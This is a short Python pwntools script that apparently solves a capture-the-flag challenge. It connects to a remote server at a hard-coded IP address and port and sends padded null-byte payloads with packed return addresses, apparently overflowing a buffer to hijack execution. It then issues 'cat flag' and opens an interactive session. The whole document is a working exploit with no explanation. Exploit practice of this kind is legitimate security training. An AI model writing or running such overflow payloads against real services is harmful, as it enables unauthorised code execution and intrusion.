from pwn import *

proc = remote("109.233.56.90", 11620)
proc.sendline(b"echo\x00" + b"\x00"*(0x20-5) + p64(0x004007df))
proc.sendline(b"cat flag")
proc.sendline(b"echo\x00" + b"\x00"*(0x20-5) + p64(0x004007c7))
proc.interactive()
